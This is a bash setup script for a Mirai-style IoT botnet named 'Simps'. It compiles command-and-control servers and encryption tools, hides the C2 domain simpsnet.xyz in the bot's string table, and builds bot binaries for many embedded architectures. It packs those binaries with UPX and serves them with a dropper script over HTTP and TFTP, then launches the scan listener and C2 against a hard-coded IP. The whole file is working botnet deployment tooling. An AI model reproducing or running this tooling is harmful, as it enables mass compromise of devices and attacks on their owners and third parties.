#!/bin/bash
#u can use this if you already have the bins and shit installed and u just need to setup the net its self
ulimit -n 999999
ulimit -u unlimited
ulimit -e unlimited
ulimit -s unlimited
cd
cd /etc/xcompile
echo "export PATH armv4l"
export PATH=$PATH:/etc/xcompile/armv4l/bin
echo "export PATH armv5l"
export PATH=$PATH:/etc/xcompile/armv5l/bin
echo "export PATH armv6l"
export PATH=$PATH:/etc/xcompile/armv6l/bin
echo "export PATH armv7l"
export PATH=$PATH:/etc/xcompile/armv7l/bin
echo "export PATH i586"
export PATH=$PATH:/etc/xcompile/i586/bin
echo "export PATH i686"
export PATH=$PATH:/etc/xcompile/i686/bin
echo "export PATH m68k"
export PATH=$PATH:/etc/xcompile/m68k/bin
echo "export PATH mips"
export PATH=$PATH:/etc/xcompile/mips/bin
echo "export PATH mipsel"
export PATH=$PATH:/etc/xcompile/mipsel/bin
echo "export PATH powerpc"
export PATH=$PATH:/etc/xcompile/powerpc/bin
echo "export PATH sh4"
export PATH=$PATH:/etc/xcompile/sh4/bin
echo "export PATH sparc"
export PATH=$PATH:/etc/xcompile/sparc/bin
echo "export PATH x86_64"
export PATH=$PATH:/etc/xcompile/x86_64/bin
echo "export PATH powerpc-440fp"
export PATH=$PATH:/etc/xcompile/powerpc-440fp/bin
cd
echo "Creating Cnc"
chmod 777 *
cd Botnet
cd cnc
gcc c2.c -o c2 -pthread -g -w
gcc cc.c -o cc -g -w
rm -rf cc.c
cd
cd Botnet
cd tools
gcc botencrypt.c -o botencrypt -g -w
gcc dec.c -o dec -g -w
gcc enc.c -o enc -g -w
./enc string simpsnet.xyz # this is for the table enc
gcc encrypt.c -o encrypt -g -w
./encrypt encrypt simpsnet.xyz
gcc portgen.c -o portgen -g -w
./portgen
gcc badbot.c -o badbot -g -w
gcc xor.c -o xor -g -w
rm -rf botenc.c
rm -rf botencrypt.c
rm -rf dec.c
rm -rf enc.c
rm -rf encrypt.c
rm -rf portgen.c
rm -rf badbot.c
echo "Setting Up Net"
cd /var/www/html
rm -rf *
cd
cd Botnet
chmod 777 *
./build.sh debug
./build.sh release
mkdir /var/www/html/Simps
cp /root/Botnet/release/* /var/www/html/Simps
cd
cd Botnet
cd tools
rm -rf xor.c
cd
cd Botnet/dlr
chmod 777 *
./build.sh
cd release
chmod 777 *
python hex.py
cd
cd Botnet/loader
chmod 777 *
./build.sh
./build.debug.sh
cp /root/Botnet/dlr/release/* /root/Botnet/loader/bins/
cp /root/Botnet/debug/scanListen /root/Botnet/loader
cd
cd Botnet/cnc
chmod 777 *
rm -rf c2.c
./cc 45.14.224.127 #1.1.1.1
mkdir /var/lib/tftpboot
cd
cd /var/lib/tftpboot
rm -rf *
cd
mv /root/Botnet/cnc/N1qq3r.sh /var/www/html
mv /root/Botnet/cnc/tftp* /var/lib/tftpboot
cd Botnet
wget https://github.com/upx/upx/releases/download/v3.94/upx-3.94-i386_linux.tar.xz
tar -xvf *.xz
mv upx*/upx .
./upx --ultra-brute /var/www/html/Simps/*
./upx --ultra-brute /var/lib/tftpboot/*
rm -rf upx*
mv /root/Botnet/tools/shell /var/www/html
mv /root/Botnet/index.html /var/www/html
rm -rf *.sh
rm -rf *.txt
rm -rf *.md
#wget https://cdn.discordapp.com/attachments/817516039914913792/819013937256333313/index.html
mv /root/Botnet/tools/index.html /var/www/html/Simps
cd
cd Botnet
cd ReadMe
chmod 777 *
cd
cd Botnet
cd debug
chmod 777 *
echo "Screen The scanListen."
screen ./scanListen
cd
cd Botnet
cd cnc
chmod 777 *
clear
clear
echo "Screen The Cnc."
screen ./c2
